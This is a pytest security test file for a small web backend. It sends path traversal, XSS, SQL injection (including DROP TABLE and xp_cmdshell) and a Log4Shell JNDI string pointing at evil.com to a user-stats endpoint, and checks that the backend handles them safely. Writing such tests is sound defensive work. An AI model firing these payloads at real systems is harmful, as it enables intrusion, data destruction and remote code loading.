import pytest
import requests
from simple_backend import app

class TestSecurity:
    
    def setup_method(self):
        """Setup test client"""
        self.app = app.test_client()
        self.app.testing = True
    
    def test_input_validation_user_id(self):
        """Test input validation for user IDs"""
        malicious_inputs = [
            '../../../etc/passwd',
            '<script>alert("xss")</script>',
            'SELECT * FROM users',
            '${jndi:ldap://evil.com/a}',
            'user\0malicious',
            'very_long_user_name_' * 100
        ]
        
        for user_id in malicious_inputs:
            response = self.app.get(f'/api/user/{user_id}/stats')
            # Should handle gracefully (not crash)
            assert response.status_code in [200, 400, 422]
            
            # Check that response doesn't contain malicious content
            response_text = response.get_data(as_text=True)
            assert '<script>' not in response_text
            assert 'SELECT * FROM' not in response_text
    
    def test_sql_injection_attempts(self):
        """Test SQL injection attempts"""
        sql_injection_attempts = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "1' UNION SELECT * FROM users --",
            "'; EXEC xp_cmdshell('dir'); --"
        ]
        
        for payload in sql_injection_attempts:
            response = self.app.get(f'/api/user/{payload}/stats')
            # Should not crash or expose data
            assert response.status_code in [200, 400, 422]
    
    def test_xss_prevention(self):
        """Test XSS prevention"""
        xss_payloads = [
            '<script>alert("xss")</script>',
            'javascript:alert("xss")',
            '<img src="x" onerror="alert(1)">',
            '"><script>alert(1)</script>',
            '<svg onload=alert(1)>'
        ]
        
        for payload in xss_payloads:
            response = self.app.get(f'/api/user/{payload}/stats')
            response_text = response.get_data(as_text=True)
            
            # Check that XSS payload is not reflected
            assert '<script>' not in response_text
            assert 'javascript:' not in response_text
            assert 'onerror=' not in response_text
            assert 'onload=' not in response_text
    
    def test_large_request_handling(self):
        """Test handling of unusually large requests"""
        large_user_id = 'a' * 10000  # Very long user ID
        
        response = self.app.get(f'/api/user/{large_user_id}/stats')
        # Should handle gracefully
        assert response.status_code in [200, 400, 413, 422]
    
    def test_rate_limiting(self):
        """Test rate limiting (if implemented)"""
        # Make many rapid requests
        responses = []
        for i in range(100):
            response = self.app.get('/api/health')
            responses.append(response.status_code)
        
        # Should still respond (rate limiting might return 429)
        assert all(status in [200, 429] for status in responses)
    
    def test_cors_security(self):
        """Test CORS security headers"""
        response = self.app.get('/health')
        
        # Check for proper CORS headers
        cors_headers = [
            'Access-Control-Allow-Origin',
            'Access-Control-Allow-Methods',
            'Access-Control-Allow-Headers'
        ]
        
        for header in cors_headers:
            assert header in response.headers, f"Missing CORS header: {header}"
    
    def test_error_information_disclosure(self):
        """Test that errors don't disclose sensitive information"""
        # Trigger various errors
        response = self.app.get('/api/nonexistent/endpoint')
        assert response.status_code == 404
        
        # Error response should not contain sensitive info
        response_text = response.get_data(as_text=True)
        sensitive_info = [
            'password', 'token', 'secret', 'key',
            'internal', 'stack trace', 'file path'
        ]
        
        for info in sensitive_info:
            assert info.lower() not in response_text.lower(), f"Sensitive info disclosed: {info}"
    
    def test_request_size_limits(self):
        """Test handling of oversized requests"""
        # This would be more relevant for POST requests, but we can test URL length
        very_long_url = '/api/user/' + 'a' * 10000 + '/stats'
        
        response = self.app.get(very_long_url)
        # Should handle gracefully
        assert response.status_code in [200, 400, 414, 422]
